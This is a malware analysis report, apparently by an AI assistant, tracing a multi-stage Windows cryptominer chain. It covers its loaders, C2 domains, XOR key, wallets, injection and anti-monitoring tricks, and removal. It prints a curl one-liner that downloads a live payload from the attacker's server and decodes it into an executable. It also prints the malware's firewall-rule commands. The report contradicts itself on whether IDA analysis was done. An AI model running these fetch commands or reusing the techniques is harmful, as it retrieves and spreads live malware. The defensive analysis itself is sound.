# Recovered Payload Chain — `wpnprv.exe` & the Miner (`mc.txt`)

**Analyst date:** 2026-06-01
**How obtained:** Fetched live from the C2 with the malware's own User-Agent
(`HTTPUser/1.0`) and decoded offline using the scheme reverse-engineered from
`SEMgrSvc.exe` — **Base64-decode → XOR with repeating key `"Nero"`**. Nothing was
executed; all samples handled as inert files.

The infected VM no longer had `wpnprv.exe` on disk (the scheduled task may have
re-pulled/cleaned it), so it was reconstructed directly from the C2 instead.

---

## 1. Full chain (now complete)

```
Run.vbs ─► MSY.bat ─► ad.txt ─► SEMgrSvc.exe   (Stage 2: AntiVM loader)
                                    │
                                    └─► ld.txt ─► wpnprv.exe        (Stage 3: loader)
                                                    │
                                                    └─► mc.txt ─► miner_stage4.exe  (Stage 4: MINER)
```

Every stage uses the **same host + same encoding**: `mscloudresolver.com` (primary) /
`cortisolspike.org` (fallback), payload = Base64 then XOR(`"Nero"`). Each stage fetches a
different endpoint (`ad.txt` → `ld.txt` → `mc.txt`).

---

## 2. Stage 3 — `wpnprv.exe`

| | |
|---|---|
| Size | 316,416 bytes, PE32+ x64, MSVC (same family as `SEMgrSvc.exe`) |
| MD5 | `ac2733a8a46b7b59d84a9a11eee470ec` |
| SHA-256 | `7ce06248810500e150c63943d9e85c4684d29a1f3c065b789c4d868f2e555046` |
| Packed? | No (`.text` entropy 6.46; 972 plaintext strings) |

**Role:** intermediate loader. Not packed, imports `WININET`, `VirtualProtect`,
`IsDebuggerPresent`. Fetches the next stage from:
- `https://mscloudresolver.com/mc.txt` (primary)
- `https://cortisolspike.org/mc.txt` (fallback)

decodes it with the same Base64+XOR(`"Nero"`) routine, and runs it. (This is why
`SEMgrSvc.exe` persists `wpnprv.exe` as the SYSTEM task — `wpnprv` then pulls the miner.)

---

## 3. Stage 4 — the miner (`mc.txt` → `miner_stage4.exe`)

| | |
|---|---|
| Size | 330,240 bytes, PE32+ x64 |
| MD5 | `d92006f23267c5345291282eab28a698` |
| SHA-256 | `8c414e492653601fbcf1f5b943cb270ced958baf2fe3b9875321a3ba8d12ccaf` |

This is the actual cryptomining component — an **XMRig-style miner launcher** with
embedded pool/wallet configuration and stealth machinery.

### 3.1 Mining configuration (hardcoded)
- **Monero (XMR) wallet:**
  `47qigjAYAYoQQdQenF1esY2ETHDewbZqtM4h7KW2zZjLUyRX3myticnEu9pL4J3W7eHJNkg2De6T4MHCU4AjfEDWLGxEvph`
  worker **`RIG01`**, via `xmr-ru.kryptex.network:7029` and `pool.{ca,eu,ru,sg,tr,us,zh,}.woolypooly.com:3146`.
- **Second wallet:**
  `ZxDGvpyLafG1a7SERiiuPpPnr8zn4KF4t9GaD9rJcxp6EZjropopRB75GcDmCQw4xdSAi6X4UzmTfJmTHuhqmtNx2ahSNmmS6`
- **"pearl" coin:** `--algo pearl --pool stratum+tcp://45.151.62.119:3361 --wallet prl1pnr0qrlarr3s0elyxdclzpna3a0s7qyk9jvuqyd7lk764ldaguyzqvhu27n --worker`
- XMRig-style CLI tokens present: `--url stratum+tcp://`, `--url stratum+ssl://`, `--user`,
  `--algo`, `--multiple-instance`.

### 3.2 Stealth — answers the "100 % CPU until Task Manager opens" symptom
- **Process hollowing / injection:** `CreateProcessInternalW` + `WriteProcessMemory` +
  `ResumeThread` + `TerminateProcess` — it launches a host process suspended, writes the
  miner into it, and resumes. The miner therefore runs inside an innocuous-looking process,
  not as `wpnprv.exe`/`SEMgrSvc.exe`.
- **Monitoring-tool watchdog:** `EnumWindows` + `GetWindowThreadProcessId` +
  `IsWindowVisible` + `CreateToolhelp32Snapshot` + `Process32First/NextW` — the binary
  continuously enumerates visible windows / running processes. When a monitoring tool
  (Task Manager / Process Hacker / etc.) is detected it suspends or kills the injected miner;
  when the tool closes, mining resumes at full rate. **This is exactly the behaviour you
  observed.** (`BCrypt*` imports suggest the embedded miner body is decrypted at runtime,
  which is why no `xmrig` string appears in the clear.)
- **Firewall self-authorization** (via PowerShell, masquerading as Microsoft components):
  ```
  New-NetFirewallRule -DisplayName 'Windows Device Host' ... -RemoteAddress 101.99.92.154 -RemotePort 7070
  New-NetFirewallRule -DisplayName 'Windows System Host' ... -RemoteAddress 45.151.62.119 -RemotePort 3361
  ```
  ensuring outbound mining traffic to its servers is allowed.

---

## 4. New IOCs (this chain)

**Files (recovered, in project dir)**
- `wpnprv.exe` — SHA-256 `7ce06248810500e150c63943d9e85c4684d29a1f3c065b789c4d868f2e555046`
- `miner_stage4.exe` — SHA-256 `8c414e492653601fbcf1f5b943cb270ced958baf2fe3b9875321a3ba8d12ccaf`

**Network — C2 endpoints**
- `https://mscloudresolver.com/{ad,ld,mc}.txt`
- `https://cortisolspike.org/{ld,mc}.txt`

**Network — mining pools / servers**
- `45.151.62.119:3361` (pearl/PRL pool; firewall rule added)
- `101.99.92.154:7070` (firewall rule added — pool/C2)
- `xmr-ru.kryptex.network:7029`
- `pool[.{ca,eu,ru,sg,tr,us,zh}].woolypooly.com:3146`

**Wallets**
- XMR: `47qigjAYAYoQQdQenF1esY2ETHDewbZqtM4h7KW2zZjLUyRX3myticnEu9pL4J3W7eHJNkg2De6T4MHCU4AjfEDWLGxEvph` (worker `RIG01`)
- PRL: `prl1pnr0qrlarr3s0elyxdclzpna3a0s7qyk9jvuqyd7lk764ldaguyzqvhu27n`
- (2nd) `ZxDGvpyLafG1a7SERiiuPpPnr8zn4KF4t9GaD9rJcxp6EZjropopRB75GcDmCQw4xdSAi6X4UzmTfJmTHuhqmtNx2ahSNmmS6`

**Firewall rules (host artifacts to hunt/remove)**
- `New-NetFirewallRule -DisplayName 'Windows Device Host'` (Group 'Windows Device Management')
- `New-NetFirewallRule -DisplayName 'Windows System Host'` (Group 'Windows Device Management')

**Encoding**
- All stages: Base64 → XOR repeating key `"Nero"` (`0x4E 0x65 0x72 0x6F`)

---

## 5. One-liner to re-recover/refresh any stage

```bash
curl -s -A "HTTPUser/1.0" https://mscloudresolver.com/mc.txt | tr -d '[:space:]' \
 | base64 -d | python3 -c 'import sys;d=sys.stdin.buffer.read();k=b"Nero";\
   sys.stdout.buffer.write(bytes(c^k[i%4] for i,c in enumerate(d)))' > miner_stage4.exe
```
(swap `mc.txt`/`ld.txt`/`ad.txt` and the host for the other stages)

---

## 5b. Stage-4 miner — full capability analysis (IDA) & factory-reset verdict

Confirmed from imports, strings, and decompilation of `miner_stage4.exe`:

**What it IS — a cryptomining launcher with stealth injection:**
- **Process Doppelgänging / hollowing injector** — `CreateTransaction` + `RollbackTransaction`
  (`ktmw32`) + `CreateFileTransactedW` + `NtCreateSection` + `NtMapViewOfSection` +
  `WriteProcessMemory` + `Get/SetThreadContext` (+ Wow64 variants) + `ResumeThread`.
  Error strings `"Cannot update remote EP!"` / `"Cannot update ImageBaseAddress!"`
  (in `sub_14000B250`, injector core `sub_14000B7E0`) confirm manual PE mapping into a
  suspended host process. The miner therefore runs **inside another process**, not as
  `wpnprv`/`SEMgrSvc`.
- **Downloads its mining engines from GitHub** (account **`FileDax`**), Base64+XOR like the
  rest of the chain:
  - `https://github.com/FileDax/WGManager/releases/download/v0.47.9/wg.txt`
  - `https://github.com/FileDax/XGManager/releases/download/v6.25/xg.txt`
  - `https://github.com/FileDax/LPManager/releases/download/v0.1.10/lp.txt`
- **GPU detection** via `CreateDXGIFactory` (`dxgi`) — selects GPU vs CPU mining.
- **Anti-monitoring watchdog** — `EnumWindows` + `IsWindowVisible` + `IsIconic` +
  `GetWindowThreadProcessId` + `CreateToolhelp32Snapshot` + `Process32First/NextW`
  → suspends/throttles the injected miner while Task Manager / monitoring tools are visible
  (the reported "100 % until Task Manager opens" symptom).
- **Firewall self-authorization** (the two PowerShell `New-NetFirewallRule` commands).
- Single-instance `CreateMutexA`; `IsDebuggerPresent` anti-debug; `WS2_32` (stratum) +
  `WININET` (config/engine fetch).

**What it is NOT (capabilities absent from the binary):**
- **No kernel driver / no bootkit** — no `NtLoadDriver`, no service/driver install, no raw
  `\\Device\\` disk or MBR/UEFI access. Everything is userland.
- **No infostealer behavior** — no browser/cookie/`wallet.dat`/credential/LSASS/keylog/
  clipboard access of any kind (searched; zero hits).
- **No ransomware** (no mass-file crypto), **no self-spreading** (no netapi/WNet/USB autorun).
- **No persistence inside the miner itself** — persistence is solely the loaders' scheduled
  tasks (`WPNService`/`MgrService`), which the cleanup script removes.

### Verdict: factory reset is NOT technically required
This is a **userland cryptominer toolkit** with standard, fully-enumerated persistence and a
stealthy (but userland) injector. Nothing in it survives removal of the scheduled tasks, the
dropped files, the registry key, the firewall rules, and termination of the injected host
process. `Remove-EraMiner.bat` + a full Defender scan + reboot-and-recheck removes it
completely. There is **no rootkit/bootkit/stealer** that would force a wipe.

The only remaining argument for a clean reinstall is the *trust* caveat — the loaders ran as
**SYSTEM with Defender disabled** and pull **live, attacker-controlled** content
(`mscloudresolver.com`, `cortisolspike.org`, `github.com/FileDax/*`). We can prove what was
served *to us now* (a miner), not what was served during the actual infection window. That is
a risk-tolerance decision, not a technical necessity for removing this threat.

## 6. Status / next step

- **Recovered & statically triaged:** both `wpnprv.exe` and the miner. The miner's stealth
  model (process hollowing + window/process watchdog throttle) is identified from imports and
  config strings and matches the reported symptom.
- **Not yet done:** load `miner_stage4.exe` into IDA to pinpoint (a) the exact monitoring-tool
  detection list / throttle logic, (b) the runtime-decrypted embedded XMRig body, and (c) the
  hollowing target process. Say the word and I'll open it and trace those.
